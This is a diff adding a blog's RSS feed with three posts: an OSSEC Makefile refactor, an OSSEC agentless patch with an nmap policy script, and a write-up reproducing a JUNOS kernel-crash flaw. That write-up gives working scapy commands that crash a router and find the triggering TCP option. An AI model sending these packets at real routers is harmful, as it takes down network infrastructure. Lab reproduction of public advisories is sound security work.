@@ -1,0 +1,623 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Programming on Jeremy Rossi</title>
+    <link>https://jeremyrossi.com/categories/programming/</link>
+    <description>Recent content in Programming on Jeremy Rossi</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 02 Jan 2016 18:42:35 -0500</lastBuildDate>
+    <atom:link href="https://jeremyrossi.com/categories/programming/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Ossec: The Great Makefile Refactor</title>
+      <link>https://jeremyrossi.com/blog/2016/01/02/ossec-the-great-makefile-refactor/</link>
+      <pubDate>Sat, 02 Jan 2016 18:42:35 -0500</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2016/01/02/ossec-the-great-makefile-refactor/</guid>
+      <description>
+
+&lt;p&gt;This was an idea for a blog post around 1.5 years ago when the OSSEC team
+started the the great refactor, but sadly I did nothing with it till now.&lt;/p&gt;
+
+&lt;h2 id=&#34;ossec-build-that-always-worked-but-made-me-mad:232619b735b6a9ac24db9845a236c97d&#34;&gt;OSSEC build that always worked, but made me mad&lt;/h2&gt;
+
+&lt;p&gt;OSSEC has been using a cross platform build script written in sh for ages.
+This system had worked for ages and worked everyplace most of the time.  See
+that was the problem changes to the script were very error prone and always on
+systems we did not have access to test on (I am looking at you AIX and HPUX).
+Come to think about I don&amp;rsquo;t think a single release did not cause an issue due
+to the sh build script.&lt;/p&gt;
+
+&lt;p&gt;Another thing about the build system the sprawl.  To make changes you would
+need to at least review all the following files:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;install.sh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;src/Config.Make&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;src/InstallServer.sh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;src/InstallAgent.sh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;src/Makeall&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;src/Makefile&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;**/Makefile&lt;/code&gt; (*at least 20 files)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This is a lot of places to check to made a change to the build.  Before you ask
+yes you needed to look into the &lt;code&gt;install.sh&lt;/code&gt; has it had grown some logic that
+was not in other scripts.&lt;/p&gt;
+
+&lt;p&gt;Given all this it easy to see why a change was needed, but the real reason I
+hated this systems was the last file in the above list: &lt;code&gt;Makefile&lt;/code&gt;.  We have
+1000&amp;rsquo;s of lines of logic in shell then still are using &lt;code&gt;make&lt;/code&gt; incorrectly.&lt;/p&gt;
+
+&lt;p&gt;Early in the talk about changing the build system one thing that came up as a
+requirement to not change the default &lt;code&gt;install.sh&lt;/code&gt; interface.  It&amp;rsquo;s simple and
+friendly and people love it over the standard &lt;code&gt;./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make
+install&lt;/code&gt;.  So&lt;/p&gt;
+
+&lt;h2 id=&#34;one-makefile-to-rule-them-all:232619b735b6a9ac24db9845a236c97d&#34;&gt;One Makefile to rule them all&lt;/h2&gt;
+
+&lt;p&gt;I had done this once before years ago with &lt;a href=&#34;https://waf.io/&#34;&gt;waf&lt;/a&gt; and that was not well
+received in 2010, and while it&amp;rsquo;s a great build system OSSEC should not need
+python to compile. The disdain autotools/autoconf was very apparent when ever
+it came up in discussion.&lt;/p&gt;
+
+&lt;p&gt;The choice seamed clear once we started just require &lt;a href=&#34;https://www.gnu.org/software/make/&#34;&gt;GNU Make&lt;/a&gt;.
+This gave us a huge amount of flexibility and features, and is available on
+every platform.  While it&amp;rsquo;s not default on all the platforms that OSSEC
+supports, but we thought it was a safe bet that someplace someone had a
+packages for installing &lt;a href=&#34;https://www.gnu.org/software/make/&#34;&gt;GNU Make&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I started to work and the &lt;a href=&#34;https://github.com/ossec/ossec-hids/pull/334/files&#34;&gt;first pull request&lt;/a&gt; and this started the
+process of a day long hack-o-thon for the OSSEC team.  &lt;strong&gt;This was single best
+day of working on open source in my life&lt;/strong&gt;.  People just kept doing more and
+feeding back and improving things so fast.  It was great to see and be a part
+of.&lt;/p&gt;
+
+&lt;p&gt;The new Makefile build does a lot of things in a single file and is very large,
+but it handles everything in less code then the original system.&lt;/p&gt;
+
+&lt;h4 id=&#34;build-targets:232619b735b6a9ac24db9845a236c97d&#34;&gt;Build targets&lt;/h4&gt;
+
+&lt;p&gt;OSSEC has a few major build targets:  server, local, agent, and winagent.  We
+did not break this into two makefiles as their is so much overlap in code and
+how they are built.  We decided that command like argument would required for
+which binaries to compile.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ make TARGET=server 
+# or 
+$ make TARGET=agent
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Inside the makefile the logic is simple and straight forward.  As you can see
+here:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-make&#34;&gt;ifndef TARGET
+  TARGET=failtarget
+endif # TARGET
+
+ifeq (${TARGET},agent)
+  DEFINES+=-DCLIENT
+  OSSEC_CONTROL_SRC=./init/ossec-client.sh
+  OSSEC_CONF_SRC=../etc/ossec-agent.conf
+endif
+
+ifeq (${TARGET},local)
+  DEFINES+=-DLOCAL
+  OSSEC_CONTROL_SRC=./init/ossec-local.sh
+  OSSEC_CONF_SRC=../etc/ossec-local.conf
+endif
+
+
+.PHONY: build
+build: ${TARGET}
+ifneq (${TARGET},failtarget)
+  ${MAKE} settings
+  @echo
+  ${QUIET_NOTICE}
+  @echo &amp;quot;Done building ${TARGET}&amp;quot;
+  ${QUIET_ENDCOLOR}
+endif
+  @echo
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We used the &lt;code&gt;ifndef TARGET&lt;/code&gt; it set it to &lt;code&gt;failtarget&lt;/code&gt; if not command line
+argument was specified.  We figured always needing to define a target is a good
+safe bet.&lt;/p&gt;
+
+&lt;h4 id=&#34;features-selection:232619b735b6a9ac24db9845a236c97d&#34;&gt;Features selection&lt;/h4&gt;
+
+&lt;p&gt;Adding features at compile time is not a command line argument.   This allows
+for some simple logic to for adding defines and libraries for the build.  This
+logic repeats a lot.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-make&#34;&gt;
+USE_INOTIFY=no 
+
+ifeq (${uname_S},Linux)
+    DEFINES+=-DINOTIFY_ENABLED
+    OSSEC_LDFLAGS+=-lpthread
+else
+
+ifneq (,$(filter ${USE_INOTIFY},auto yes y Y 1))
+  DEFINES+=-DINOTIFY_ENABLED
+  ifeq (${uname_S},FreeBSD)
+    OSSEC_LDFLAGS+=-linotify -L/usr/local/lib -I/usr/local/include
+    OSSEC_CFLAGS+=-I/usr/local/include
+  endif
+endif
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see in the above snippet Linux always enabled INOTIFY and if you
+have the library installed and are running FreeBSD you can enable it by running
+&lt;code&gt;make TARGET=agent USE_INOTIFY=y&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;databases-and-library-detection:232619b735b6a9ac24db9845a236c97d&#34;&gt;Databases and library detection&lt;/h4&gt;
+
+&lt;p&gt;The old database detection scripts had a lot of logic in them to get things to
+work, and porting that over into GNU Make was/is the complex part.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Ok, stand back, I going to try boolean logic
+- Someone someplace about this code.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-make&#34;&gt;MI :=
+PI :=
+ifdef DATABASE
+
+  ifeq (${DATABASE},mysql)
+    DEFINES+=-DMYSQL_DATABASE_ENABLED
+
+    ifdef MYSQL_CFLAGS
+      MI = ${MYSQL_CFLAGS}
+    else
+      MI := $(shell sh -c &#39;${MY_CONFIG} --include 2&amp;gt;/dev/null || echo &#39;)
+
+      ifeq (${MI},) # BEGIN MI manula detection
+        ifneq (,$(wildcard /usr/include/mysql/mysql.h))
+          MI=&amp;quot;-I/usr/include/mysql/&amp;quot;
+        else
+          ifneq (,$(wildcard /usr/local/include/mysql/mysql.h))
+            MI=&amp;quot;-I/usr/local/include/mysql/&amp;quot;
+          endif  #
+        endif  #MI
+
+      endif
+    endif # MYSQL_CFLAGS
+
+    ifdef MYSQL_LIBS
+      ML = ${MYSQL_LIBS}
+    else
+      ML := $(shell sh -c &#39;${MY_CONFIG} --libs 2&amp;gt;/dev/null || echo &#39;)
+
+      ifeq (${ML},)
+        ifneq (,$(wildcard /usr/lib/mysql/*))
+          ML=&amp;quot;-L/usr/lib/mysql -lmysqlclient&amp;quot;
+        else
+          ifneq (,$(wildcard /usr/lib64/mysql/*))
+            ML=&amp;quot;-L/usr/lib64/mysql -lmysqlclient&amp;quot;
+          else
+            ifneq (,$(wildcard /usr/local/lib/mysql/*))
+              ML=&amp;quot;-L/usr/local/lib/mysql -lmysqlclient&amp;quot;
+            else
+              ifneq (,$(wildcard /usr/local/lib64/mysql/*))
+                ML=&amp;quot;-L/usr/local/lib64/mysql -lmysqlclient&amp;quot;
+              endif # local/lib64
+            endif # local/lib
+          endif # lib54
+        endif # lib
+      endif
+    endif # MYSQL_LIBS
+
+    OSSEC_LDFLAGS+=${ML}
+
+  else # DATABASE
+
+    ifeq (${DATABASE}, pgsql)
+      DEFINES+=-DPGSQL_DATABASE_ENABLED
+
+      ifneq (${PGSQL_LIBS},)
+        PL:=${PGSQL_LIBS}
+      else
+        PL:=$(shell sh -c &#39;(${PG_CONFIG} --libdir --pkglibdir 2&amp;gt;/dev/null | sed &amp;quot;s/^/-L/g&amp;quot; | xargs ) || echo &#39;)
+      endif
+
+      ifneq (${PGSQL_CFLAGS},)
+        PI:=${PGSQL_CFLAGS}
+      else
+        PI:=$(shell sh -c &#39;(${PG_CONFIG} --includedir --pkgincludedir 2&amp;gt;/dev/null | sed &amp;quot;s/^/-I/g&amp;quot; | xargs ) || echo &#39;)
+      endif
+
+      # XXX need some basic autodetech stuff here.
+
+      OSSEC_LDFLAGS+=${PL}
+      OSSEC_LDFLAGS+=-lpq
+
+    endif # pgsql
+  endif # mysql
+endif # DATABASE
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Yeah we know, but this includes all the old logic that the scripts system
+preformed and some new ones.&lt;/p&gt;
+
+&lt;p&gt;If anyone knows of a better way we would love to hear it ;)&lt;/p&gt;
+
+&lt;h2 id=&#34;today:232619b735b6a9ac24db9845a236c97d&#34;&gt;Today&lt;/h2&gt;
+
+&lt;p&gt;I in writing up this Blog post I went back end reviewed the changes to the
+makefile over the last year and &lt;sup&gt;1&lt;/sup&gt;&amp;frasl;&lt;sub&gt;2&lt;/sub&gt;, and not major changes to structure or
+logic have happened.  Just new features and improvements, and looks like
+a solid foundation.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Juniper Kernel Crash - scapy Code</title>
+      <link>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</link>
+      <pubDate>Sun, 10 Jan 2010 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</guid>
+      <description>&lt;p&gt;On January 6th, we wrote about &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/&#34;&gt;a JUNOS flaw&lt;/a&gt;
+that caused a kernel crash in Juniper routers and demonstrated
+the &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-kernel-crash-video/&#34;&gt;effect in action&lt;/a&gt;
+in a video. At the time Juniper was not making details of the advisory public, however since
+then &lt;a href=&#34;http://osvdb.org/ref/61/juniper-PSN-2010-01-623.txt&#34;&gt;PSN-2010-01-623&lt;/a&gt; has shown up on
+the Open Source Vulnerability Database under entry &lt;a href=&#34;http://osvdb.org/61538&#34;&gt;61538&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Following the Juniper kernel flaw posts, we received a number of inquiries regarding how
+to determine the option value to use, however we were somewhat reluctant to provide
+that level of detail. Now that &lt;a href=&#34;http://evilrouters.net/2010/01/09/junos-psn-2010-01-623-exploit/&#34;&gt;exploit code has been published&lt;/a&gt;
+elsewhere, there is little reason not to answer this question.&lt;/p&gt;
+
+&lt;p&gt;To test all possible TCP options using &lt;a href=&#34;http://www.secdev.org/projects/scapy/&#34;&gt;scapy&lt;/a&gt;
+(a python based packet manipulation program), first download the latest copy of
+scapy (including all library dependencies) from their
+&lt;a href=&#34;http://hg.secdev.org/scapy/&#34;&gt;Mercurial code repository&lt;/a&gt; as shown below:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ hg clone http://hg.secdev.org/scapy/
+$ cd scapy
+$ python setup build
+$ sudo python setup install
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Start scapy as root:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ sudo run_scapy
+INFO: Can&#39;t import python gnuplot wrapper . Won&#39;t be able to plot.
+INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().
+WARNING: No route found for IPv6 destination :: (no default route?)
+Welcome to Scapy (2.1.0-dev)
+&amp;gt;&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We started this particular test by first creating an IP packet with a destination of the Juniper test router instance named &amp;lsquo;ipl&amp;rsquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ipl = IP(dst=&amp;quot;172.17.20.102&amp;quot;)
+&amp;gt;&amp;gt;&amp;gt; ipl
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Initially we tested all TCP options as fast as possible just to see if it was possible to reproduce the
+reported vulnerability (a kernel crash that causes the router to reboot).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; send([ipl/TCP(dport=23, options=[(x, &amp;quot;&amp;quot;)])/&amp;quot;bye bye&amp;quot; for x in range(256)])
+................................................................................................................
+................................................................................................................
+................................
+Sent 256 packets.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The previous command created 255 packets with every possible TCP option, sent them all
+at once, and the router crashed. While this performed as expected, it only told us
+that we were on the right track (the advisory was correct, an option setting
+crashes the router), however it does not tell us which option.&lt;/p&gt;
+
+&lt;p&gt;The scapy tool can send a ping following each test packet to see if the router
+is still up and responding, as demonstrated:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; for x in range(255):
+...   send(ipl/TCP(dport=&amp;quot;22&amp;quot;, options=[(x,&amp;quot;&amp;quot;)])
+...   if not sr1(/ICMP(), retry=-1, timeout=1, verbose=0):
+...     print &amp;quot;we have a winner: %s&amp;quot;%(x)
+...     break
+...
+we have a winner: 101
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have a winner, we know which option value caused the kernel crash
+Juniper reported.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Ossec: Agentless....it&#39;s good, but not good enough. </title>
+      <link>https://jeremyrossi.com/blog/2009/10/05/ossec-agentless....its-good-but-not-good-enough./</link>
+      <pubDate>Mon, 05 Oct 2009 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2009/10/05/ossec-agentless....its-good-but-not-good-enough./</guid>
+      <description>
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2009/11/Screen-shot-2009-11-02-at-8.06.14-PM.png&#34; border=&#34;1&#34; alt=&#34;ossec_logo&#34; width=&#34;66&#34; height=&#34;64&#34; /&gt;&lt;/div&gt;
+
+&lt;p&gt;In working with OSSEC agentless for some time now I have come across
+some limitations in the implementation that I felt needed to be
+addressed. As OSSEC agentless is designed to preform &lt;code&gt;syscheck&lt;/code&gt;
+functions on remote hosts, more general features are hard (if not
+impossible) to write into a script.&lt;/p&gt;
+
+&lt;p&gt;Currently in OSSEC, agentless scripts are limited to the following commands:&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Command&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;INFO:&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;The string following INFO will be logged to &lt;code&gt;/var/ossec/logs/ossec.log&lt;/code&gt; by OSSEC for debugging.&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;ERROR:&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Error needs to be reported.  The string following this command is forwarded to the OSSEC manager, and the OSSEC process closes down the script.&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;STORE:&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;All the lines that follow this command will be added, stored, and compared to previous runs of the script.&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;FWD:&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;The string following FWD is a colon delimited list of stats on a given file.  Example: &lt;code&gt;FWD: &amp;lt;size&amp;gt;:&amp;lt;permissions&amp;gt;:&amp;lt;uid&amp;gt;:&amp;lt;gid&amp;gt;:&amp;lt;md5&amp;gt;:&amp;lt;sha1&amp;gt; &amp;lt;path &amp;amp; file&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Given the choices listed here more advanced agentless scripts are just
+not reasonably possible. I require the ability to pass more information
+to the OSSEC agentless process and have it raise alerts based on this
+information.&lt;/p&gt;
+
+&lt;h3 id=&#34;solution-patch-ossec:cb8e1494328cb9e13d88df53d8999d2b&#34;&gt;Solution patch OSSEC&lt;/h3&gt;
+
+&lt;p&gt;So I starting digging into the OSSEC code. I am not a C coder, I don&amp;rsquo;t
+even play one on TV, but the OSSEC&amp;rsquo;s code is clear and has just enough
+comments to allow me to understand how things function. Once I saw where
+the communication happens between ossec-agentless and it&amp;rsquo;s subprocess I
+was quickly able to add a new OSSEC Agentless Command.&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Command&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;LOG:&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;The string following LOG: will be passed into &lt;code&gt;ossec-analysisd&lt;/code&gt; and processed like all other log messages.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;This simple command allow scripts to generate messages that will get
+processed by the standard OSSEC decoders and rules.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Direct download of patch: &lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/11/agentless.patch.txt&#34; title=&#34;agentless.patch.txt&#34;&gt;agentless.patch.txt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;patching-ossec:cb8e1494328cb9e13d88df53d8999d2b&#34;&gt;Patching OSSEC&lt;/h3&gt;
+
+&lt;p&gt;The patch I created works with the current code release of OSSEC. To
+apply the patch, first download OSSEC version 2.2 from the website. In
+the instructions below, I have changed to the tmp directory first as we
+will be removing the source files once we have finished the install.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# cd /tmp 
+obsd46# ftp http://www.ossec.net/files/ossec-hids-2.2.tar.gz
+Trying 75.126.165.213...
+Requesting http://www.ossec.net/files/ossec-hids-2.2.tar.gz
+100% |******************************************************************|   692 KB    00:03    
+Successfully retrieved file.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now expand the downloaded archive and change into the newly created
+directory &lt;code&gt;ossec-hids-2.2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# tar xfz ossec-hids-2.2.tar.gz                                                                                                                                                   
+obsd46# cd ossec-hids-2.2       
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is where most of the work will happen, but first we need to download the patch.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ftp http://praetorianprefect.com/wp-content/uploads/2009/11/agentless.patch.txt                             
+Trying 75.101.150.229...
+Requesting http://praetorianprefect.com/wp-content/uploads/2009/11/agentless.patch.txt
+100% |******************************************************************| 10278       00:00    
+Successfully retrieved file.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we just apply the patch. We will use the &lt;code&gt;patch&lt;/code&gt; command do
+this, but using the argument &lt;code&gt;-p1&lt;/code&gt; to apply the patch cleanly to all
+sub-directories.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# patch -p1 &amp;lt; agentless.patch.txt  
+Hmm... this looks like a unified diff to me...
+The text leading up to this was:
+ |-------------------------
+ |diff -r 55072a52aaa4 -r 673c04be67e9 etc/decoder.xml
+ |--- a/etc/decoder.xml  Wed Nov 04 20:51:36 2009 -0500
+ |+++ b/etc/decoder.xml  Fri Nov 06 19:53:36 2009 +0000
+ |-------------------------
+Patching file etc/decoder.xml using Plan A...
+Hunk #1 succeeded at 70.
+Hunk #2 succeeded at 1498.
+Hmm...  The next patch looks like a unified diff to me...
+The text leading up to this was:
+ |-------------------------
+ |diff -r 55072a52aaa4 -r 673c04be67e9 etc/rules/agentless_rules.xml
+ |--- /dev/null  Thu Jan 01 00:00:00 1970 +0000
+ |+++ b/etc/rules/agentless_rules.xml    Fri Nov 06 19:53:36 2009 +000 0
+ |-------------------------
+(Creating file etc/rules/agentless_rules.xml...)
+Patching file etc/rules/agentless_rules.xml using Plan A...
+Empty context always matches.
+Hunk #1 succeeded at 1.
+Hmm...  The next patch looks like a unified diff to me...
+The text leading up to this was:
+ |-------------------------
+ |diff -r 55072a52aaa4 -r 673c04be67e9 etc/rules/ossec_rules.xml
+ |--- a/etc/rules/ossec_rules.xml        Wed Nov 04 20:51:36 2009 -0500
+ |+++ b/etc/rules/ossec_rules.xml        Fri Nov 06 19:53:36 2009 +0000
+ |-------------------------
+Patching file etc/rules/ossec_rules.xml using Plan A...
+Hunk #1 succeeded at 153.
+Hmm...  The next patch looks like a unified diff to me...
+The text leading up to this was:
+ |-------------------------
+ |diff -r 55072a52aaa4 -r 673c04be67e9 etc/templates/config/rules.template
+ |--- a/etc/templates/config/rules.template      Wed Nov 04 20:51:36 2009 -0500
+ |+++ b/etc/templates/config/rules.template      Fri Nov 06 19:53:36 2009 +0000
+ |-------------------------
+Patching file etc/templates/config/rules.template using Plan A...
+Hunk #1 succeeded at 44.
+Hmm...  The next patch looks like a unified diff to me...
+The text leading up to this was:
+ |-------------------------
+ |diff -r 55072a52aaa4 -r 673c04be67e9 src/agentlessd/scripts/nmap_policy
+ |--- /dev/null  Thu Jan 01 00:00:00 1970 +0000
+ |+++ b/src/agentlessd/scripts/nmap_policy       Fri Nov 06 19:53:36 2009 +0000
+ |-------------------------
+(Creating file src/agentlessd/scripts/nmap_policy...)
+Patching file src/agentlessd/scripts/nmap_policy using Plan A...
+Empty context always matches.
+Hunk #1 succeeded at 1.
+done 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we have a completed all the OSSEC 2.2 code patches for the
+expanded agentless features. At this point you will need to
+compile and install OSSEC. For full details the main
+&lt;a href=&#34;http://www.ossec.net/main/documentation/&#34;&gt;OSSEC website&lt;/a&gt; covers this topic in
+more detail. A key thing to note here is that OSSEC has to be installed
+as a server or locally.&lt;/p&gt;
+
+&lt;p&gt;Please see my article on how to enable &lt;a href=&#34;http://praetorianprefect.com/archives/2009/11/ossec-agentless-to-save-the-day/&#34;&gt;OSSEC agentless monitoring&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;making-use-of-the-new-features:cb8e1494328cb9e13d88df53d8999d2b&#34;&gt;Making use of the new features&lt;/h3&gt;
+
+&lt;p&gt;Now that we have a patched and installed version of OSSEC we can take
+advantage of the newly added features. Included with the patch is a
+new Agentless OSSEC script &lt;code&gt;nmap_policy&lt;/code&gt;. This script is really not
+designed for production use, rather it&amp;rsquo;s geared to show how to use the
+new agentless features.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s get into the details. Start by running the new script and looking
+at the output. I should note that this script uses &lt;code&gt;python&lt;/code&gt; and needs at
+least version 2.5 in order to parse the xml output from &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd45# (cd /var/ossec &amp;amp;&amp;amp; ./agentless -b 21,23,80 -n 172.17.20.20/32 )
+INFO: Starting
+INFO: running `nmap -p 21,23,80 -oX - 172.17.20.0/24` command
+INFO: completed `nmap -p 21,23,80 -oX - 172.17.20.0/24` command
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)
+LOG:alert=11 Policy violation port 23 (telnet) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.19 (00:18:8B:1E:27:A5 Dell)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.20 (00:0C:29:84:72:11 VMware)
+LOG:alert=11 Policy violation port 21 (ftp) is open on host 172.17.20.20 (00:0C:29:84:72:11 VMware)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.21 (00:0C:29:8D:39:E4 VMware)
+LOG:alert=11 Policy violation port 21 (ftp) is open on host 172.17.20.21 (00:0C:29:8D:39:E4 VMware)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.31 (00:0C:29:29:CF:35 VMware)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.32 (00:0C:29:58:5F:C1 VMware)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.57 (00:1E:0B:9D:C0:03 Hewlett Packard)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.91 (00:14:38:D8:01:DD Hewlett Packard)
+LOG:alert=11 Policy violation port 21 (ftp) is open on host 172.17.20.134 (00:1E:C2:03:2D:E8 Apple)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.202 (00:19:B9:24:7E:F2 Dell)
+LOG:alert=11 Policy violation port 80 (http) is open on host 172.17.20.203 (00:19:B9:24:7E:F2 Dell)
+INFO: Ending
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So what this script does is run &lt;code&gt;nmap&lt;/code&gt; and looks for ports that are open
+and not allowed per an internal policy. In this example I checked for
+http, telnet, and ftp, but the selection of ports is configurable with
+the &lt;code&gt;-b&lt;/code&gt;/&lt;code&gt;--badport&lt;/code&gt; arguments. The second argument &lt;code&gt;-n&lt;/code&gt;/&lt;code&gt;--network&lt;/code&gt; is
+used to specify which IP addresses to scan. The format of this option is
+very liberal, in fact any valid &lt;code&gt;nmap&lt;/code&gt; network specification will work.&lt;/p&gt;
+
+&lt;p&gt;Just as I specified above any string following the &lt;code&gt;LOG:&lt;/code&gt; OSSEC
+agentless command will be pushed to the &lt;code&gt;ossec-analysisd&lt;/code&gt; process for
+decoding and rules filtering.&lt;/p&gt;
+
+&lt;p&gt;As part of the patch I have also included an updated &lt;code&gt;decode.xml&lt;/code&gt; and
+a new &lt;code&gt;agentless_rules.xml&lt;/code&gt; to begin the first level of processing
+of output from the scripts. Using &lt;code&gt;ossec-logtest&lt;/code&gt; we can see this in
+action, but due to how &lt;code&gt;ossec-agentlessd&lt;/code&gt; processes the messages we need
+to slightly modify the output for it to work with &lt;code&gt;ossec-logtest&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# (cd /var/ossec &amp;amp;&amp;amp; ./bin/ossec-logtest )                                                                                                                                                            
+2009/11/06 20:48:28 ossec-testrule: INFO: Started (pid: 9789).
+ossec-testrule: Type one log per line.
+
+Agentless: Log:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)
+
+
+**Phase 1: Completed pre-decoding.
+       full event: &#39;Agentless: Log:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)&#39;
+       hostname: &#39;a&#39;
+       program_name: &#39;(null)&#39;
+       log: &#39;Agentless: Log:alert=11 Policy violation port 80 (http) is open on host 172.17.20.1 (00:0E:83:A9:E6:80 Cisco Systems)&#39;
+
+**Phase 2: Completed decoding.
+       decoder: &#39;agentless&#39;
+       id: &#39;11&#39;
